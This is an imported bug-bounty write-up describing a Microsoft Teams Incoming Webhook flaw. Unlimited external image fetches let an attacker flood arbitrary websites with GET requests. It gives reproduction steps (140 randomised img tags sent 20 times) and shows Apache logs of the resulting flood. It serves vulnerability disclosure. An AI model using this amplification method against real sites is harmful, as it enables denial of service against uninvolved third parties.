---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-10_abusing-microsoft-teams-rate-limiting-for-ddos.md
original_filename: 2020-06-10_abusing-microsoft-teams-rate-limiting-for-ddos.md
title: Abusing Microsoft Teams rate limiting for DDoS
category: documents
detected_topics:
- rate-limit
- command-injection
- webhooks
tags:
- imported
- documents
- rate-limit
- command-injection
- webhooks
language: en
raw_sha256: 559c0cfaf6ea2f12ffadd5c1a6f7d6e1e4cf0305f532b12cf8acb83353515081
text_sha256: e809d997b5f10b813b8cbbfb853c30bd8f0bc3ef7276f75eebebedd1e61b5701
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Abusing Microsoft Teams rate limiting for DDoS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-10_abusing-microsoft-teams-rate-limiting-for-ddos.md
- Source Type: markdown
- Detected Topics: rate-limit, command-injection, webhooks
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `559c0cfaf6ea2f12ffadd5c1a6f7d6e1e4cf0305f532b12cf8acb83353515081`
- Text SHA256: `e809d997b5f10b813b8cbbfb853c30bd8f0bc3ef7276f75eebebedd1e61b5701`


## Content

---
title: "Abusing Microsoft Teams rate limiting for DDoS"
url: "https://medium.com/swlh/abusing-microsoft-teams-rate-limiting-for-ddos-a8238958376a"
authors: ["Omayr Zanata (@omayrzanata)"]
programs: ["Microsoft"]
bugs: ["DoS"]
publication_date: "2020-06-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4514
scraped_via: "browseros"
---

# Abusing Microsoft Teams rate limiting for DDoS

Abusing Microsoft Teams rate limiting for DDoS
Omayr Zanata
Follow
6 min read
·
Jun 10, 2020

567

3

--Disclaimer--
Microsoft:
Thank you again for your submission to MSRC. Our engineers have  investigated the report and we have informed the appropriate team about  the issues you reported. However, this case does not meet the bar for  servicing by MSRC and we will be closing this case, but the engineering team is working on improving this in the future.
Summary

The vulnerability is basically the lack of rate limit when Microsoft Teams Webhook is performing GET requests to load external images

Descritpion

Microsoft Teams Incoming Webhook supports html, so it was possible to get external images using <img src=””/>, the browser tries to load the message and the backend performs a GET request trying to retrieve the image, so it was possible to replace the picture url to any url and perform GET requests to any website, with the lack of rate limit was possible to flood the website with GET requests.

Steps to Reproduce:
Sign in on Microsoft Teams
On ‘MyTeam’ > General, add a ‘Incoming Webhook’ Connector
Copy the Webhook URL
Insert the URL into the Script
The script loads 140 broken images into the request <img src=”example.com?randomquery={0}”/>
Every request must have a diferent query to load a ‘different’ image and perform a different GET Request
Send the request 20 times
When I open the teams app and the Teams channel loads, it performs all the GET Requests at the same time, causing a flood on the server receiving the requests, I can even send the request to various channels and click to load one after another.
I set up a simple Apache2 Server to test the requests and I was able to get more than 2600 requests in a couple seconds
The information on the received request is
Get Omayr Zanata’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

IP: 52.114.128.37 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
whois 52.114.128.37
Supporting materials/ references:
Press enter or click to view image in full size
Screenshot 1 — Testing the flood on webhook.site
Press enter or click to view image in full size
Screenshot 2 — Screenshot of the Teams Screen after loading ‘images’
Python3 exploit — exploit.py
Apache2 Logs — access.log
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=961 HTTP/1.1" 200 11012 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=350 HTTP/1.1" 200 11012 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=990 HTTP/1.1" 200 11012 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=341 HTTP/1.1" 200 11012 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=950 HTTP/1.1" 200 11012 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=910 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=821 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=870 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=640 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=451 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=170 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:33 +0000] "GET /?o1o111o=680 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=411 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=60 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=391 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=91 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=720 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=571 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=900 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=131 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=21 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=810 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=141 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=781 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=570 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=550 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=690 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=421 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=520 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=500 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=480 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=420 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=351 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=80 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=991 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=541 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=151 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=270 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=891 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=750 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=71 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=661 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=851 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=790 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=671 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=760 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=221 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=00 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=731 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=430 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=371 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
52.114.128.37 - - [29/Apr/2020:20:39:34 +0000] "GET /?o1o111o=941 HTTP/1.1" 200 10956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
